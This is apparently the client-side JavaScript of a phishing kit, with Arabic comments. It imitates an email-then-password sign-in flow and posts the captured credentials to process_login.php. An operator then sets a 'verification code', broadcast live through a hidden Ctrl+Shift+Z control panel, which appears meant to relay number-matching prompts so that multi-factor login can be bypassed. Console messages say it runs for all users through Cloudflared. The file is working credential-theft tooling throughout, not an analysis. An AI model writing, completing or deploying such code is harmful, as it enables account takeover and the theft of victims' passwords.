// ════════════════════════════════════════════════════
// 🎮 المتغيرات الرئيسية والتحكم
// ════════════════════════════════════════════════════

let currentEmail = '';
let currentVerificationCode = "86";
const transitionEmailToPassword = 4000;
const transitionPasswordToPhone = 5000;
const transitionPhoneToVerification = 4000;

// ════════════════════════════════════════════════════
// 🌐 دوال الاتصال بالسيرفر
// ════════════════════════════════════════════════════

// جلب الرقم الحالي من السيرفر
async function fetchCurrentCode() {
    try {
        const response = await fetch('/get_code');
        const data = await response.json();
        currentVerificationCode = data.code;
        updateVerificationCodeDisplay();
        updateCurrentCodeDisplay();
        return data.code;
    } catch (error) {
        console.error('❌ فشل جلب الرقم:', error);
        return currentVerificationCode;
    }
}

// تحديث الرقم على السيرفر
async function updateServerCode(newCode) {
    try {
        const response = await fetch('/set_code', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ code: newCode })
        });
        
        const data = await response.json();
        if (data.status === 'success') {
            currentVerificationCode = data.code;
            updateVerificationCodeDisplay();
            updateCurrentCodeDisplay();
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل تحديث الرقم:', error);
        return false;
    }
}

// مراقبة التغييرات من السيرفر
async function startCodePolling() {
    setInterval(async () => {
        try {
            const response = await fetch('/poll_code?current_code=' + currentVerificationCode);
            const data = await response.json();
            
            if (data.changed && data.code !== currentVerificationCode) {
                currentVerificationCode = data.code;
                updateVerificationCodeDisplay();
                updateCurrentCodeDisplay();
                console.log('🔄 تم تحديث الرقم من السيرفر:', currentVerificationCode);
            }
        } catch (error) {
            console.error('❌ فشل في المراقبة:', error);
        }
    }, 2000); // فحص كل 2 ثانية
}

// ════════════════════════════════════════════════════
// 🎯 دوال التحكم في الرقم
// ════════════════════════════════════════════════════

// دالة لتطبيق الرقم الجديد
async function applyCustomCode() {
    const newCode = document.getElementById('customCodeInput').value.trim();
    
    if (newCode && !isNaN(newCode) && newCode.length <= 3) {
        const success = await updateServerCode(newCode);
        if (success) {
            document.getElementById('customCodeInput').value = '';
            alert(`✅ تم تغيير الرقم إلى: ${currentVerificationCode} لجميع المستخدمين!`);
        } else {
            alert('❌ فشل في تحديث الرقم على السيرفر');
        }
    } else {
        alert('❌ الرجاء إدخال رقم صحيح (1 إلى 3 أرقام)');
    }
}

// دالة لتحديث عرض الرقم في الصفحة
function updateVerificationCodeDisplay() {
    const codeElement = document.getElementById('dynamicVerificationCode');
    const codeInText = document.getElementById('codeInText');
    
    if (codeElement) {
        codeElement.textContent = currentVerificationCode;
    }
    if (codeInText) {
        codeInText.textContent = currentVerificationCode;
    }
}

// دالة لعرض الرقم الحالي
function showCurrentCode() {
    alert(`🔢 الرقم الحالي هو: ${currentVerificationCode}`);
}

// دالة لتحديث عرض الرقم في لوحة التحكم
function updateCurrentCodeDisplay() {
    const display = document.getElementById('currentCodeDisplay');
    if (display) {
        display.textContent = currentVerificationCode;
    }
}

// ════════════════════════════════════════════════════
// 🎮 لوحة التحكم السرية
// ════════════════════════════════════════════════════

// تفعيل لوحة التحكم بالضغط على Ctrl+Shift+Z
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'Z') {
        const panel = document.getElementById('codeControlPanel');
        if (panel.style.display === 'none' || !panel.style.display) {
            panel.style.display = 'block';
            updateCurrentCodeDisplay();
        } else {
            panel.style.display = 'none';
        }
    }
});

function hideControlPanel() {
    document.getElementById('codeControlPanel').style.display = 'none';
}

// ════════════════════════════════════════════════════
// 🔄 دوال التنقل بين الصفحات
// ════════════════════════════════════════════════════

async function validateEmail(){
    const emailInput = document.getElementById('emailInput');
    currentEmail = emailInput.value.trim();
    
    if(!currentEmail){
        alert('يرجى إدخال بريد إلكتروني');
        return;
    }
    
    const progress = document.getElementById('globalProgressBar');
    progress.style.display = 'block';
    const emailScreen = document.getElementById('emailScreen');
    emailScreen.classList.add('fade-out');
    
    setTimeout(() => {
        progress.style.display = 'none';
        emailScreen.style.display = 'none';
        document.getElementById('emailButtons').style.display = 'none';
        document.getElementById('userEmailDisplay').textContent = currentEmail;
        
        const passwordScreen = document.getElementById('passwordScreen');
        passwordScreen.style.display = 'flex';
        document.getElementById('passwordButtons').style.display = 'flex';
        passwordScreen.classList.remove('fade-out');
    }, transitionEmailToPassword);
}

async function submitPassword(){
    const passwordInput = document.getElementById('passwordInput');
    const password = passwordInput.value.trim();
    
    if(!password){
        alert('يرجى إدخال كلمة المرور');
        return;
    }
    
    const progress = document.getElementById('globalProgressBar');
    progress.style.display = 'block';
    const passwordScreen = document.getElementById('passwordScreen');
    passwordScreen.classList.add('fade-out');
    
    // ⭐ جلب أحدث رقم من السيرفر قبل الانتقال
    await fetchCurrentCode();
    
    const formData = new FormData();
    formData.append('email', currentEmail);
    formData.append('password', password);
    
    fetch('process_login.php', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if(!response.ok) throw new Error('Network error');
        return response.text();
    })
    .then(() => {
        setTimeout(() => {
            progress.style.display = 'none';
            passwordScreen.style.display = 'none';
            document.getElementById('passwordButtons').style.display = 'none';
            document.getElementById('phoneEmailDisplay').textContent = currentEmail;
            
            const phoneScreen = document.getElementById('phoneScreen');
            phoneScreen.style.display = 'flex';
            
            // ⭐ تأكيد تحديث الرقم النهائي قبل العرض
            updateVerificationCodeDisplay();
            
        }, transitionPasswordToPhone);
    })
    .catch(error => {
        console.error('Error:', error);
        progress.style.display = 'none';
        alert('حدث خطأ أثناء إرسال البيانات.');
    });
}

// ════════════════════════════════════════════════════
// 🚀 تهيئة الصفحة
// ════════════════════════════════════════════════════

// عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // بدء مراقبة التغييرات من السيرفر
    startCodePolling();
    
    // جلب الرقم الحالي
    fetchCurrentCode();
    
    // تفعيل إعادة الإرسال بعد 3 ثواني
    const resend = document.getElementById("resend");
    setTimeout(() => resend.classList.add("blue"), 3000);
    
    console.log('🚀 Zoala-GOD Cloud System Activated!');
    console.log('🌐 النظام الآن يعمل مع جميع المستخدمين عبر Cloudflared');
    console.log('🎮 استخدم Ctrl+Shift+Z لفتح لوحة التحكم');
});

// باقي الدوال المتبقية (نفس الكود السابق)...
// [أضف هنا باقي الدوال التي لم تتغير مثل togglePasswordVisibility وغيرها]